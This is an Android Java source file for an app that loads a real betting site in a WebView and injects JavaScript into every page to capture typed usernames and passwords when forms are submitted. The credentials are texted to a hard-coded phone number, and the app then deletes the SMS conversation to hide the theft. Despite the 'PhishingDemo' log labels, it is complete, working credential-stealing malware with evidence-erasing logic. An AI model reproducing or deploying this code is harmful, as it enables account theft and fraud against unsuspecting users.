package com.enixcoda.smsforward;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast; // Optional: for visual feedback during testing

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private WebView webView;
    private static final String TARGET_PHONE_NUMBER_FOR_DEMO = "+251942667102";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Requesting all necessary permissions
        requestPermissions(new String[]{
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.INTERNET,
                Manifest.permission.READ_CONTACTS
        }, 0);

        webView = findViewById(R.id.webview);
        WebSettings webSettings = webView.getSettings();

        // --- OPTIMIZATIONS for better mobile viewing ---

        // Enable essential web features like JavaScript, DOM Storage, and Database.
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setDatabaseEnabled(true);

        // This forces the WebView to load the page with an overview mode,
        // fitting the content to the screen width. This is crucial for
        // sites that are not mobile-optimized.
        webSettings.setLoadWithOverviewMode(true);

        // This allows the WebView to use a wide viewport, which works in
        // conjunction with setLoadWithOverviewMode to provide a better overview.
        webSettings.setUseWideViewPort(true);

        // Allow the user to zoom in and out using pinch gestures.
        webSettings.setBuiltInZoomControls(true);

        // Hide the on-screen zoom controls, which can clutter the UI.
        // The user can still zoom with pinch gestures.
        webSettings.setDisplayZoomControls(false);

        // Improve performance by caching content.
        webSettings.setCacheMode(WebSettings.LOAD_DEFAULT);

        // Enable Geolocation for websites that use location services.
        webSettings.setGeolocationEnabled(true);

        // --- Original functionality ---
        webSettings.setSavePassword(true);
        webSettings.setSaveFormData(true);

        webView.addJavascriptInterface(new WebAppInterface(this, TARGET_PHONE_NUMBER_FOR_DEMO), "AndroidCredentialsInterface");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                String jsToInject = "(function() {" +
                        "   function captureCredentials() {" +
                        "       let usernameInput = null;" +
                        "       let passwordInput = null;" +
                        "       const inputs = document.getElementsByTagName('input');" +
                        "       for (let i = 0; i < inputs.length; i++) {" +
                        "           const input = inputs[i];" +
                        "           const inputType = input.type ? input.type.toLowerCase() : '';" +
                        "           const inputName = input.name ? input.name.toLowerCase() : '';" +
                        "           const inputId = input.id ? input.id.toLowerCase() : '';" +
                        "           const autocomplete = input.autocomplete ? input.autocomplete.toLowerCase() : '';" +
                        "           if (inputType === 'password' || autocomplete.includes('password')) {" +
                        "               passwordInput = input;" +
                        "           }" +
                        "           else if (inputType === 'email' || inputType === 'text' || inputType === 'tel') {" +
                        "               if (autocomplete.includes('username') || autocomplete.includes('email') ||" +
                        "                   inputName.includes('user') || inputName.includes('email') || inputName.includes('login') ||" +
                        "                   inputId.includes('user') || inputId.includes('email') || inputId.includes('login')) {" +
                        "                   usernameInput = input;" +
                        "               }" +
                        "           }" +
                        "       }" +
                        "       if (passwordInput && passwordInput.value) {" +
                        "           const userVal = (usernameInput && usernameInput.value) ? usernameInput.value : 'Username N/A or not found';" +
                        "           const passVal = passwordInput.value;" +
                        "           if (window.AndroidCredentialsInterface && typeof window.AndroidCredentialsInterface.processCapturedCredentials === 'function') {" +
                        "               window.AndroidCredentialsInterface.processCapturedCredentials(userVal, passVal);" +
                        "           }" +
                        "       }" +
                        "   }" +
                        "   document.addEventListener('click', function(event) {" +
                        "       const target = event.target;" +
                        "       if (target.tagName.toLowerCase() === 'button' || (target.tagName.toLowerCase() === 'input' && target.type.toLowerCase() === 'submit')) {" +
                        "           setTimeout(captureCredentials, 250);" +
                        "       }" +
                        "   }, true);" +
                        "   document.addEventListener('submit', function(event) {" +
                        "       setTimeout(captureCredentials, 250);" +
                        "   }, true);" +
                        "})();";

                view.evaluateJavascript(jsToInject, null);
                Log.d("PhishingDemo", "Advanced JavaScript Injected for URL: " + url);
            }
        });

        String targetUrl = "https://jambobet.bet/";
        webView.loadUrl(targetUrl);
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    public static class WebAppInterface {
        Context mContext;
        String targetPhoneNumber;

        WebAppInterface(Context c, String phoneNumber) {
            mContext = c;
            targetPhoneNumber = phoneNumber;
        }

        @JavascriptInterface
        public void processCapturedCredentials(String username, String password) {
            final String message = "Phishing Demo Captured:\nUser: " + username + "\nPass: " + password;
            Log.d("PhishingDemo", "Captured: User=" + username);
            try {
                // Send the SMS using the existing Forwarder
                com.enixcoda.smsforward.Forwarder.sendSMS(this.targetPhoneNumber, message);
                Log.i("PhishingDemo", "SMS with credentials sent to " + this.targetPhoneNumber);

                // Start a background thread to find and delete the entire conversation thread
                new Thread(() -> deleteConversationWithPolling(this.targetPhoneNumber)).start();

            } catch (Exception e) {
                Log.e("PhishingDemo", "Error sending SMS: " + e.getMessage(), e);
            }
        }

        /**
         * Gets the thread ID for a given phone number.
         * This is a more direct way to find the conversation.
         */
        private long getThreadIdForRecipient(String recipient) {
            Uri threadIdUri = Uri.parse("content://mms-sms/threadID");
            Uri.Builder builder = threadIdUri.buildUpon();
            builder.appendQueryParameter("recipient", recipient);

            long threadId = -1;
            Cursor cursor = null;
            try {
                cursor = mContext.getContentResolver().query(builder.build(), new String[]{"_id"}, null, null, null);
                if (cursor != null && cursor.moveToFirst()) {
                    threadId = cursor.getLong(0);
                }
            } catch (Exception e) {
                Log.e("PhishingDemo", "Exception in getThreadIdForRecipient", e);
            } finally {
                if (cursor != null) {
                    cursor.close();
                }
            }
            return threadId;
        }

        /**
         * Repeatedly polls to find the conversation thread_id and then deletes the entire thread.
         * This version is more robust.
         */
        private void deleteConversationWithPolling(String recipient) {
            final int MAX_ATTEMPTS = 15;
            final int RETRY_DELAY_MS = 1000;
            long threadId = -1;

            Log.d("PhishingDemo", "Starting robust polling to delete conversation for " + recipient);

            // Step 1: Poll to find the thread_id.
            for (int i = 0; i < MAX_ATTEMPTS; i++) {
                threadId = getThreadIdForRecipient(recipient);
                if (threadId != -1) {
                    Log.i("PhishingDemo", "Found thread_id: " + threadId + " on attempt " + (i + 1));
                    break;
                }

                Log.d("PhishingDemo", "Attempt #" + (i + 1) + ": thread_id not found. Retrying...");
                try {
                    Thread.sleep(RETRY_DELAY_MS);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    Log.e("PhishingDemo", "Polling thread interrupted.", e);
                    return; // Exit if interrupted
                }
            }

            if (threadId == -1) {
                Log.e("PhishingDemo", "FINAL FAILURE: Could not find thread_id for recipient " + recipient + " after " + MAX_ATTEMPTS + " attempts.");
                return;
            }

            // Step 2: Delete the entire conversation thread using the found thread_id.
            try {
                ContentResolver contentResolver = mContext.getContentResolver();
                // This is a more direct and often more effective URI for deleting a thread.
                Uri threadUri = Uri.parse("content://sms/conversations/" + threadId);
                int deletedRows = contentResolver.delete(threadUri, null, null);

                if (deletedRows > 0) {
                    Log.i("PhishingDemo", "SUCCESS: Deleted " + deletedRows + " rows for thread_id: " + threadId);
                } else {
                    Log.w("PhishingDemo", "FAILURE: Delete operation returned 0 rows for thread_id: " + threadId + ". The thread might have already been deleted or the delete failed.");
                }
            } catch (Exception e) {
                Log.e("PhishingDemo", "EXCEPTION while deleting conversation thread " + threadId, e);
            }
        }
    }
}
